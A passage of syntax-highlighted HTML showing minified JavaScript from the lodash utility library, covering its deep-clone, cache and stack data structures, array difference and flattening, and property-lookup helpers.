function_">di</span>(t.<span class="property">buffer</span>) : t.<span class="property">buffer</span>;</span><br><span class="line">                                                        <span class="keyword">return</span> <span class="keyword">new</span> t.<span class="title function_">constructor</span>(<span class="params">n, t.byteOffset, t.byteLength</span>)</span><br><span class="line">                                                    &#125;(t, n);</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">S</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">C</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">H</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">T</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">A</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">O</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="string">&quot;[object Uint8ClampedArray]&quot;</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">E</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">k</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="title function_">pi</span>(t, n);</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">v</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="keyword">new</span> r;</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">m</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">w</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">r</span>(t);</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">y</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                                        <span class="keyword">var</span> e = <span class="keyword">new</span> t.<span class="title function_">constructor</span>(<span class="params">t.source, rt.exec(t)</span>);</span><br><span class="line">                                                        <span class="keyword">return</span> e.<span class="property">lastIndex</span> = t.<span class="property">lastIndex</span>,</span><br><span class="line">                                                            e</span><br><span class="line">                                                    &#125;(t);</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">b</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="keyword">new</span> r;</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">_</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> i = t,</span><br><span class="line">                                                        <span class="title class_">Hn</span> ? <span class="title function_">pt</span>(<span class="title class_">Hn</span>.<span class="title function_">call</span>(i)) : &#123;&#125;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">var</span> i</span><br><span class="line">                                        &#125;(t, L, c)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                o || (o = <span class="keyword">new</span> <span class="title class_">Dn</span>);</span><br><span class="line">                                <span class="keyword">var</span> P = o.<span class="title function_">get</span>(t);</span><br><span class="line">                                <span class="keyword">if</span> (P)</span><br><span class="line">                                    <span class="keyword">return</span> P;</span><br><span class="line">                                o.<span class="title function_">set</span>(t, a),</span><br><span class="line">                                    <span class="title class_">Za</span>(t) ? t.<span class="title function_">forEach</span>((<span class="keyword">function</span> (<span class="params">r</span>) &#123;</span><br><span class="line">                                            a.<span class="title function_">add</span>(<span class="title class_">Qn</span>(r, e, n, r, t, o))</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    )) : <span class="title class_">Ya</span>(t) &amp;&amp; t.<span class="title function_">forEach</span>((<span class="keyword">function</span> (<span class="params">r, i</span>) &#123;</span><br><span class="line">                                            a.<span class="title function_">set</span>(i, <span class="title class_">Qn</span>(r, e, n, i, t, o))</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    ));</span><br><span class="line">                                <span class="keyword">var</span> j = x ? <span class="keyword">void</span> <span class="number">0</span> : (f ? u ? <span class="title class_">Wi</span> : <span class="title class_">Yi</span> : u ? xc : _c)(t);</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">ce</span>(j || t, (<span class="keyword">function</span> (<span class="params">r, i</span>) &#123;</span><br><span class="line">                                        j &amp;&amp; (r = t[i = r]),</span><br><span class="line">                                            <span class="title class_">Un</span>(a, i, <span class="title class_">Qn</span>(r, e, n, i, t, o))</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                    a</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Jn</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = n.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="literal">null</span> == t)</span><br><span class="line">                                    <span class="keyword">return</span> !r;</span><br><span class="line">                                <span class="keyword">for</span> (t = <span class="title function_">pt</span>(t); r--;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> i = n[r]</span><br><span class="line">                                        , o = e[i]</span><br><span class="line">                                        , a = t[i];</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> === a &amp;&amp; !(i <span class="keyword">in</span> t) || !<span class="title function_">o</span>(a))</span><br><span class="line">                                        <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Kn</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="string">&quot;function&quot;</span> != <span class="keyword">typeof</span> t)</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">gt</span>(o);</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">_o</span>((<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                        t.<span class="title function_">apply</span>(<span class="keyword">void</span> <span class="number">0</span>, n)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                ), e)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">tr</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> i = -<span class="number">1</span></span><br><span class="line">                                    , o = he</span><br><span class="line">                                    , a = !<span class="number">0</span></span><br><span class="line">                                    , c = t.<span class="property">length</span></span><br><span class="line">                                    , s = []</span><br><span class="line">                                    , u = e.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">if</span> (!c)</span><br><span class="line">                                    <span class="keyword">return</span> s;</span><br><span class="line">                                n &amp;&amp; (e = <span class="title function_">de</span>(e, <span class="title class_">Ee</span>(n))),</span><br><span class="line">                                    r ? (o = fe,</span><br><span class="line">                                        a = !<span class="number">1</span>) : e.<span class="property">length</span> &gt;= <span class="number">200</span> &amp;&amp; (o = <span class="title class_">Le</span>,</span><br><span class="line">                                        a = !<span class="number">1</span>,</span><br><span class="line">                                        e = <span class="keyword">new</span> <span class="title class_">Fn</span>(e));</span><br><span class="line">                                <span class="attr">t</span>: <span class="keyword">for</span> (; ++i &lt; c;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> l = t[i]</span><br><span class="line">                                        , h = <span class="literal">null</span> == n ? l : <span class="title function_">n</span>(l);</span><br><span class="line">                                    <span class="keyword">if</span> (l = r || <span class="number">0</span> !== l ? l : <span class="number">0</span>,</span><br><span class="line">                                    a &amp;&amp; h == h) &#123;</span><br><span class="line">                                        <span class="keyword">for</span> (<span class="keyword">var</span> f = u; f--;)</span><br><span class="line">                                            <span class="keyword">if</span> (e[f] === h)</span><br><span class="line">                                                <span class="keyword">continue</span> t;</span><br><span class="line">                                        s.<span class="title function_">push</span>(l)</span><br><span class="line">                                    &#125; <span class="keyword">else</span></span><br><span class="line">                                        <span class="title function_">o</span>(e, h, r) || s.<span class="title function_">push</span>(l)</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> s</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="title class_">An</span>.<span class="property">templateSettings</span> = &#123;</span><br><span class="line">                                <span class="attr">escape</span>: R,</span><br><span class="line">                                <span class="attr">evaluate</span>: I,</span><br><span class="line">                                <span class="attr">interpolate</span>: $,</span><br><span class="line">                                <span class="attr">variable</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                                <span class="attr">imports</span>: &#123;</span><br><span class="line">                                    <span class="attr">_</span>: <span class="title class_">An</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">En</span>.<span class="property"><span class="keyword">prototype</span></span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">An</span>,</span><br><span class="line">                                kn.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">On</span>(<span class="title class_">En</span>.<span class="property"><span class="keyword">prototype</span></span>),</span><br><span class="line">                                kn.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = kn,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">On</span>(<span class="title class_">En</span>.<span class="property"><span class="keyword">prototype</span></span>),</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Ln</span>,</span><br><span class="line">                                <span class="title class_">Vn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">clear</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__data__</span> = yn ? <span class="title function_">yn</span>(<span class="literal">null</span>) : &#123;&#125;,</span><br><span class="line">                                        <span class="variable language_">this</span>.<span class="property">size</span> = <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Vn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">delete</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="title function_">has</span>(t) &amp;&amp; <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">__data__</span>[t];</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">size</span> -= e ? <span class="number">1</span> : <span class="number">0</span>,</span><br><span class="line">                                        e</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Vn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">get</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">__data__</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (yn) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> n = e[t];</span><br><span class="line">                                        <span class="keyword">return</span> <span class="string">&quot;__lodash_hash_undefined__&quot;</span> === n ? <span class="keyword">void</span> <span class="number">0</span> : n</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> zt.<span class="title function_">call</span>(e, t) ? e[t] : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Vn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">__data__</span>;</span><br><span class="line">                                    <span class="keyword">return</span> yn ? <span class="keyword">void</span> <span class="number">0</span> !== e[t] : zt.<span class="title function_">call</span>(e, t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Vn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">set</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="variable language_">this</span>.<span class="property">__data__</span>;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">size</span> += <span class="variable language_">this</span>.<span class="title function_">has</span>(t) ? <span class="number">0</span> : <span class="number">1</span>,</span><br><span class="line">                                        n[t] = yn &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> === e ? <span class="string">&quot;__lodash_hash_undefined__&quot;</span> : e,</span><br><span class="line">                                        <span class="variable language_">this</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Pn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">clear</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__data__</span> = [],</span><br><span class="line">                                        <span class="variable language_">this</span>.<span class="property">size</span> = <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Pn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">delete</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">__data__</span></span><br><span class="line">                                        , n = <span class="title function_">qn</span>(e, t);</span><br><span class="line">                                    <span class="keyword">return</span> !(n &lt; <span class="number">0</span>) &amp;&amp; (n == e.<span class="property">length</span> - <span class="number">1</span> ? e.<span class="title function_">pop</span>() : <span class="title class_">Xt</span>.<span class="title function_">call</span>(e, n, <span class="number">1</span>),</span><br><span class="line">                                        --<span class="variable language_">this</span>.<span class="property">size</span>,</span><br><span class="line">                                        !<span class="number">0</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Pn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">get</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">__data__</span></span><br><span class="line">                                        , n = <span class="title function_">qn</span>(e, t);</span><br><span class="line">                                    <span class="keyword">return</span> n &lt; <span class="number">0</span> ? <span class="keyword">void</span> <span class="number">0</span> : e[n][<span class="number">1</span>]</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Pn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">qn</span>(<span class="variable language_">this</span>.<span class="property">__data__</span>, t) &gt; -<span class="number">1</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Pn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">set</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="variable language_">this</span>.<span class="property">__data__</span></span><br><span class="line">                                        , r = <span class="title function_">qn</span>(n, t);</span><br><span class="line">                                    <span class="keyword">return</span> r &lt; <span class="number">0</span> ? (++<span class="variable language_">this</span>.<span class="property">size</span>,</span><br><span class="line">                                        n.<span class="title function_">push</span>([t, e])) : n[r][<span class="number">1</span>] = e,</span><br><span class="line">                                        <span class="variable language_">this</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                jn.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">clear</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">size</span> = <span class="number">0</span>,</span><br><span class="line">                                        <span class="variable language_">this</span>.<span class="property">__data__</span> = &#123;</span><br><span class="line">                                            <span class="attr">hash</span>: <span class="keyword">new</span> <span class="title class_">Vn</span>,</span><br><span class="line">                                            <span class="attr">map</span>: <span class="keyword">new</span> (pn || <span class="title class_">Pn</span>),</span><br><span class="line">                                            <span class="attr">string</span>: <span class="keyword">new</span> <span class="title class_">Vn</span></span><br><span class="line">                                        &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                jn.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">delete</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="title class_">Ji</span>(<span class="variable language_">this</span>, t).<span class="title function_">delete</span>(t);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">size</span> -= e ? <span class="number">1</span> : <span class="number">0</span>,</span><br><span class="line">                                        e</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                jn.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">get</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Ji</span>(<span class="variable language_">this</span>, t).<span class="title function_">get</span>(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                jn.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Ji</span>(<span class="variable language_">this</span>, t).<span class="title function_">has</span>(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                jn.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">set</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="title class_">Ji</span>(<span class="variable language_">this</span>, t)</span><br><span class="line">                                        , r = n.<span class="property">size</span>;</span><br><span class="line">                                    <span class="keyword">return</span> n.<span class="title function_">set</span>(t, e),</span><br><span class="line">                                        <span class="variable language_">this</span>.<span class="property">size</span> += n.<span class="property">size</span> == r ? <span class="number">0</span> : <span class="number">1</span>,</span><br><span class="line">                                        <span class="variable language_">this</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Fn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add</span> = <span class="title class_">Fn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">__data__</span>.<span class="title function_">set</span>(t, <span class="string">&quot;__lodash_hash_undefined__&quot;</span>),</span><br><span class="line">                                        <span class="variable language_">this</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Fn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">__data__</span>.<span class="title function_">has</span>(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Dn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">clear</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__data__</span> = <span class="keyword">new</span> <span class="title class_">Pn</span>,</span><br><span class="line">                                        <span class="variable language_">this</span>.<span class="property">size</span> = <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Dn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">delete</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">__data__</span></span><br><span class="line">                                        , n = e.<span class="title function_">delete</span>(t);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">size</span> = e.<span class="property">size</span>,</span><br><span class="line">                                        n</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Dn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">get</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">__data__</span>.<span class="title function_">get</span>(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Dn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">__data__</span>.<span class="title function_">has</span>(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Dn</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">set</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="variable language_">this</span>.<span class="property">__data__</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (n <span class="keyword">instanceof</span> <span class="title class_">Pn</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> r = n.<span class="property">__data__</span>;</span><br><span class="line">                                        <span class="keyword">if</span> (!pn || r.<span class="property">length</span> &lt; <span class="number">199</span>)</span><br><span class="line">                                            <span class="keyword">return</span> r.<span class="title function_">push</span>([t, e]),</span><br><span class="line">                                                <span class="variable language_">this</span>.<span class="property">size</span> = ++n.<span class="property">size</span>,</span><br><span class="line">                                                <span class="variable language_">this</span>;</span><br><span class="line">                                        n = <span class="variable language_">this</span>.<span class="property">__data__</span> = <span class="keyword">new</span> <span class="title function_">jn</span>(r)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> n.<span class="title function_">set</span>(t, e),</span><br><span class="line">                                        <span class="variable language_">this</span>.<span class="property">size</span> = n.<span class="property">size</span>,</span><br><span class="line">                                        <span class="variable language_">this</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            ;</span><br><span class="line">                            <span class="keyword">var</span> er = <span class="title function_">xi</span>(ur)</span><br><span class="line">                                , nr = <span class="title function_">xi</span>(lr, !<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">rr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = !<span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">er</span>(t, (<span class="keyword">function</span> (<span class="params">t, r, i</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> n = !!<span class="title function_">e</span>(t, r, i)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                    n</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ir</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> r = -<span class="number">1</span>, i = t.<span class="property">length</span>; ++r &lt; i;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> o = t[r]</span><br><span class="line">                                        , a = <span class="title function_">e</span>(o);</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="literal">null</span> != a &amp;&amp; (<span class="keyword">void</span> <span class="number">0</span> === c ? a == a &amp;&amp; !<span class="title class_">Ja</span>(a) : <span class="title function_">n</span>(a, c)))</span><br><span class="line">                                        <span class="keyword">var</span> c = a</span><br><span class="line">                                            , s = o</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> s</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">or</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = [];</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">er</span>(t, (<span class="keyword">function</span> (<span class="params">t, r, i</span>) &#123;</span><br><span class="line">                                        <span class="title function_">e</span>(t, r, i) &amp;&amp; n.<span class="title function_">push</span>(t)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                    n</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ar</span>(<span class="params">t, e, n, r, i</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> o = -<span class="number">1</span></span><br><span class="line">                                    , a = t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">for</span> (n || (n = ao),</span><br><span class="line">                                     i || (i = []); ++o &lt; a;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> c = t[o];</span><br><span class="line">                                    e &gt; <span class="number">0</span> &amp;&amp; <span class="title function_">n</span>(c) ? e &gt; <span class="number">1</span> ? <span class="title function_">ar</span>(c, e - <span class="number">1</span>, n, r, i) : <span class="title function_">pe</span>(i, c) : r || (i[i.<span class="property">length</span>] = c)</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> i</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> cr = <span class="title function_">zi</span>()</span><br><span class="line">                                , sr = <span class="title function_">zi</span>(!<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ur</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t &amp;&amp; <span class="title function_">cr</span>(t, e, _c)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">lr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t &amp;&amp; <span class="title function_">sr</span>(t, e, _c)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">hr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">le</span>(e, (<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Ia</span>(t[e])</span><br><span class="line">                                    &#125;</span><br><span class="line">                                ))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">fr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>, r = (e = <span class="title function_">si</span>(e, t)).<span class="property">length</span>; <span class="literal">null</span> != t &amp;&amp; n &lt; r;)</span><br><span class="line">                                    t = t[<span class="title class_">Ho</span>(e[n++])];</span><br><span class="line">                                <span class="keyword">return</span> n &amp;&amp; n == r ? t : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">dr</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = <span class="title function_">e</span>(t);</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Va</span>(t) ? r : <span class="title function_">pe</span>(r, <span class="title function_">n</span>(t))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">pr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span> == t ? <span class="keyword">void</span> <span class="number">0</span> === t ? <span class="string">&quot;[object Undefined]&quot;</span> : <span class="string">&quot;[object Null]&quot;</span> : <span class="title class_">Jt</span> &amp;&amp; <span class="title class_">Jt</span> <span class="keyword">in</span> <span class="title function_">pt</span>(t) ? <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = zt.<span class="title function_">call</span>(t, <span class="title class_">Jt</span>)</span><br><span class="line">                                        , n = t[<span class="title class_">Jt</span>];</span><br><span class="line">                                    <span class="keyword">try</span> &#123;</span><br><span class="line">                                        t[<span class="title class_">Jt</span>] = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">var</span> r = !<span class="number">0</span></span><br><span class="line">                                    &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">var</span> i = <span class="title class_">Ct</span>.<span class="title function_">call</span>(t);</span><br><span class="line">                                    r &amp;&amp; (e ? t[<span class="title class_">Jt</span>] = n : <span class="keyword">delete</span> t[<span class="title class_">Jt</span>]);</span><br><span class="line">                                    <span class="keyword">return</span> i</span><br><span class="line">                                &#125;(t) : <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Ct</span>.<span class="title function_">call</span>(t)</span><br><span class="line">                                &#125;(t)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">vr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t &gt; e</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">mr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span> != t &amp;&amp; zt.<span class="title function_">call</span>(t, e)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">gr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span> != t &amp;&amp; 